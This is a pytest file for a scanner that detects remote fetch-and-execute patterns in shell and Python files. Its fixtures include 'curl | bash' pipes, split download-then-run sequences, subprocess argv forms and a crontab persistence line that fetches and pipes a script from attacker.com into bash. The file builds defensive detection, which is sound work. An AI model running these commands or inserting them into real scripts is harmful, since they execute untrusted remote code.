"""T3 FN-twin gate: the SPLIT (download-then-execute) form of remote fetch-exec.

The pipe form (`curl URL | bash`) was caught; its twin — download to a file, then run
that same file — was NOT, because the download-target regexes required the URL to appear
BEFORE the `-o` flag. Real installers overwhelmingly write `curl -o FILE URL` (flag
first), and the subprocess-argv form `["curl", "-o", f, url]` (agent-reach cli.py:602)
is flag-first by construction. Both fell through, so a repo that fetch-executes a remote
script vetted SAFE — the single most dangerous verdict this scanner exists to prevent.

Each FN twin below pairs with the pipe control: same threat, different syntax. The
precision twins are the other half of the gate — this repo is mid false-BLOCK campaign,
so a download with no execute, an execute of a never-downloaded file, and a command
merely QUOTED in a comment must all stay silent.
"""
from pathlib import Path

from medusa.scanners.remote_fetch_exec_scanner import RemoteFetchExecScanner

RULE = "MEDUSA-RCE-FETCHEXEC-001"
URL = "https://deb.nodesource.com/setup_22.x"


def _issues(tmp_path, name, content):
    f = tmp_path / name
    f.write_text(content)
    return RemoteFetchExecScanner().scan_file(f).issues


def _rules(tmp_path, name, content):
    return [i.rule_id for i in _issues(tmp_path, name, content)]


# --- control: the form that already worked ---------------------------------- #
def test_control_pipe_form_flagged_high(tmp_path):
    issues = _issues(tmp_path, "install.sh", f"curl -fsSL {URL} | bash\n")
    assert [i.rule_id for i in issues] == [RULE]
    assert issues[0].severity.name == "HIGH", issues[0].severity


# --- FN twins: split download -> execute ------------------------------------ #
def test_fn_twin_curl_o_then_bash_same_line(tmp_path):
    # `;` separator, both halves on ONE line — the exact repro from the ticket
    content = f"curl -o /tmp/f {URL} ; bash /tmp/f\n"
    assert RULE in _rules(tmp_path, "install.sh", content)


def test_fn_twin_curl_o_then_bash_separate_lines(tmp_path):
    # newline separator: download, then execute further down the file
    content = f"set -e\ncurl -o /tmp/f {URL}\necho fetched\nbash /tmp/f\n"
    assert RULE in _rules(tmp_path, "install.sh", content)


def test_fn_twin_curl_o_then_bash_andand_and_or(tmp_path):
    # `&&` and `|| true` are the other separators installers actually use
    for sep in ("&&", "|| true ;"):
        content = f"curl -o /tmp/f {URL} {sep} bash /tmp/f\n"
        assert RULE in _rules(tmp_path, "install.sh", content), sep


def test_fn_twin_curl_long_output_flag(tmp_path):
    content = f"curl --output /tmp/f {URL}\nsh /tmp/f\n"
    assert RULE in _rules(tmp_path, "install.sh", content)


def test_fn_twin_wget_O_then_sh(tmp_path):
    content = f"wget -O /tmp/f {URL}\nsh /tmp/f\n"
    assert RULE in _rules(tmp_path, "provision.sh", content)


def test_fn_twin_wget_plain_url_basename(tmp_path):
    # bare `wget URL` writes the URL basename into cwd — then it is run
    content = "wget https://get.example.com/i.sh\nbash i.sh\n"
    assert RULE in _rules(tmp_path, "provision.sh", content)


def test_fn_twin_wget_directory_prefix(tmp_path):
    # `-P dir` puts the URL basename under dir
    content = "wget -P /tmp https://get.example.com/i.sh\nbash /tmp/i.sh\n"
    assert RULE in _rules(tmp_path, "provision.sh", content)


def test_fn_twin_redirect_then_exec(tmp_path):
    content = f"curl -fsSL {URL} > /tmp/f\nsh /tmp/f\n"
    assert RULE in _rules(tmp_path, "install.sh", content)


def test_fn_twin_chmod_then_direct_exec(tmp_path):
    # download, mark executable, run it directly (no interpreter word at all)
    abs_form = f"curl -o /tmp/f {URL}\nchmod +x /tmp/f && /tmp/f\n"
    rel_form = f"curl -o ./setup.sh {URL}\nchmod +x ./setup.sh\n./setup.sh\n"
    assert RULE in _rules(tmp_path, "a.sh", abs_form)
    assert RULE in _rules(tmp_path, "b.sh", rel_form)


def test_fn_twin_source_and_dot(tmp_path):
    for exe in ("source", "."):
        content = f"curl -o /tmp/env.sh {URL}\n{exe} /tmp/env.sh\n"
        assert RULE in _rules(tmp_path, "install.sh", content), exe


def test_fn_twin_variable_target(tmp_path):
    content = f'TMP=$(mktemp)\ncurl -o "$TMP" {URL}\nbash "$TMP"\n'
    assert RULE in _rules(tmp_path, "install.sh", content)


# --- FN twin: Python, the agent-reach cli.py:602 shape ----------------------- #
def test_fn_twin_python_subprocess_argv(tmp_path):
    # list-args, no shell: the form that evades every pipe/shell-string detector
    content = (
        "import subprocess\n"
        "f = '/tmp/setup.sh'\n"
        "url = 'https://deb.nodesource.com/setup_22.x'\n"
        'subprocess.run(["curl", "-o", f, url])\n'
        'subprocess.run(["bash", f])\n'
    )
    assert RULE in _rules(tmp_path, "cli.py", content)


def test_fn_twin_python_subprocess_argv_literal_path(tmp_path):
    content = (
        "import subprocess\n"
        f'subprocess.run(["curl", "-o", "/tmp/setup.sh", "{URL}"])\n'
        'subprocess.run(["bash", "/tmp/setup.sh"])\n'
    )
    assert RULE in _rules(tmp_path, "cli.py", content)


def test_fn_twin_python_shell_string_pipe(tmp_path):
    content = f'import subprocess\nsubprocess.run("curl -fsSL {URL} | bash", shell=True)\n'
    assert RULE in _rules(tmp_path, "cli.py", content)


def test_python_files_are_in_scope(tmp_path):
    s = RemoteFetchExecScanner()
    assert ".py" in s.get_file_extensions()
    assert s.can_scan(Path("cli.py")) is True
    assert s.get_confidence_score(Path("cli.py")) > 0


# --- precision twins: must NOT flag ----------------------------------------- #
def test_precision_download_without_execute(tmp_path):
    content = f"curl -o /tmp/f {URL}\necho done\n"
    assert _rules(tmp_path, "install.sh", content) == []


def test_precision_local_script_never_downloaded(tmp_path):
    content = "bash ./scripts/build.sh\nsh /usr/local/bin/deploy.sh\n./scripts/test.sh\n"
    assert _rules(tmp_path, "run.sh", content) == []


def test_precision_local_script_alongside_unrelated_download(tmp_path):
    # a real download of one file must not license flagging a DIFFERENT local script
    content = f"curl -o /tmp/data.json {URL}\nbash ./scripts/build.sh\n"
    assert _rules(tmp_path, "run.sh", content) == []


def test_precision_data_download_only_read(tmp_path):
    content = (
        "import subprocess, json\n"
        'subprocess.run(["curl", "-o", "data.json", "https://x.io/data.json"])\n'
        'cfg = json.load(open("data.json"))\n'
    )
    assert _rules(tmp_path, "fetch.py", content) == []


def test_precision_command_quoted_in_a_comment(tmp_path):
    # prose ABOUT the install line, inside code files, is not the repo fetch-executing
    shell = f"#!/bin/bash\n# Install with: curl -fsSL {URL} | bash\n# curl -o /tmp/f {URL}\n# bash /tmp/f\necho hi\n"
    py = f'# subprocess.run("curl -fsSL {URL} | bash", shell=True)\nprint(1)\n'
    assert _rules(tmp_path, "install.sh", shell) == []
    assert _rules(tmp_path, "cli.py", py) == []


def test_precision_python_docstring_prose(tmp_path):
    # found by the self-scan: this scanner's OWN module docstring, which documents the
    # attack it detects, self-flagged. A docstring is a multi-line comment.
    content = (
        '"""Detects the split form.\n'
        '\n'
        f'  curl -o /tmp/f {URL}\n'
        '  bash /tmp/f\n'
        '"""\n'
        'def go():\n'
        '    """Docs only.\n'
        f'    curl -fsSL {URL} | bash\n'
        '    """\n'
        '    return 1\n'
    )
    assert _rules(tmp_path, "scanner.py", content) == []


def test_docstring_suppression_is_not_an_evasion(tmp_path):
    # a triple-quoted shell script that is ASSIGNED and then run opens MID-line, so it
    # is live code — suppression must not hand attackers a trivial wrapper
    content = (
        "import subprocess\n"
        'SCRIPT = """\n'
        f"curl -o /tmp/f {URL}\n"
        "bash /tmp/f\n"
        '"""\n'
        "subprocess.run(SCRIPT, shell=True)\n"
    )
    assert RULE in _rules(tmp_path, "run.py", content)


def test_precision_execute_before_download(tmp_path):
    # running a file, then later downloading to that name, is not fetch-then-exec
    content = f"bash /tmp/f\ncurl -o /tmp/f {URL}\n"
    assert _rules(tmp_path, "install.sh", content) == []


# --- precision twins found by running the fix over the labelled corpus ------- #
def test_precision_jq_dot_is_not_the_source_builtin(tmp_path):
    # llmgateway/scripts/generate-video.sh: `jq .` pretty-prints the file curl just
    # fetched. `.` is only the source builtin when it STARTS the command.
    content = (
        f'curl -s -o "$TMPFILE" {URL}\n'
        'jq . "$TMPFILE" > "out.json"\n'
        'jq . "$TMPFILE" 2>/dev/null || cat "$TMPFILE"\n'
    )
    assert _rules(tmp_path, "generate.sh", content) == []


def test_precision_interpreter_reading_stdin(tmp_path):
    # llmgateway/scripts/image-edit.sh: `python3 -` runs the heredoc; "$RESPONSE_FILE"
    # is an ARGUMENT to that script, not the script
    content = (
        f'curl -s -o "$RESPONSE_FILE" {URL}\n'
        "python3 - \"$RESPONSE_FILE\" \"$OUTPUT_FILE\" <<'PY'\n"
        "print(1)\n"
        "PY\n"
    )
    assert _rules(tmp_path, "image-edit.sh", content) == []


def test_precision_bare_data_path_is_not_an_execution(tmp_path):
    # n8n mutation-health-nightly.yml: a lone path on a YAML continuation line. A shell
    # cannot execute `foo/bar` without `./` — neither should the correlator.
    content = (
        f'curl -o .mutation-health/live-ledger.json {URL}\n'
        "cache_paths:\n"
        "  .mutation-health/live-ledger.json\n"
    )
    assert _rules(tmp_path, "nightly.yml", content) == []


def test_direct_execution_of_downloaded_binaries_still_flags(tmp_path):
    # the true positives the tightened direct-exec rule must keep (all real corpus
    # lines): an explicit ./, /, $ or ~ prefix is a genuine execution
    for dl, run in (
        (f"curl -o ./codecov {URL}", './codecov -t "$TOKEN" -f coverage.txt'),
        (f"curl -o /tmp/mc {URL}", "/tmp/mc alias set minio http://minio:9000"),
        (f"curl -o ~/miniconda.sh {URL}", "~/miniconda.sh -b"),
        (f'curl -o "$TMP_KUBELETCTL" {URL}', '"$TMP_KUBELETCTL" version'),
    ):
        assert RULE in _rules(tmp_path, "t.sh", f"{dl}\n{run}\n"), run


def test_comment_suppression_spares_a_case_branch(tmp_path):
    # `*)` opens a shell case branch, not a block-comment continuation — real code
    content = f"case $1 in\n  *) curl -fsSL {URL} | bash ;;\nesac\n"
    assert RULE in _rules(tmp_path, "install.sh", content)


def test_comment_suppression_spares_a_cron_payload(tmp_path):
    # corpus CVE-2025-54802: a crontab persistence payload also starts with `*`.
    # Silencing it would be the single worst outcome for this rule.
    content = "crontab: |\n  * * * * * root curl -s http://attacker.com/r.sh | bash\n"
    assert RULE in _rules(tmp_path, "cve.yaml", content)


def test_pathological_line_stays_linear(tmp_path):
    # this scanner shipped possessive quantifiers because a 2 MB line once ran for
    # hours; the tokeniser replacing them must not reintroduce a blow-up
    import time

    blob = ("curl -o /tmp/f https://x.io/i.sh " + "sh -x " * 60000 + "bash /tmp/f\n")
    t0 = time.monotonic()
    _rules(tmp_path, "huge.sh", blob)
    assert time.monotonic() - t0 < 10, "tokeniser is not linear on a pathological line"


def test_precision_readme_prose_still_skipped(tmp_path):
    content = f"## Install\n\n```\ncurl -fsSL {URL} | bash\n```\n"
    assert _rules(tmp_path, "README.md", content) == []
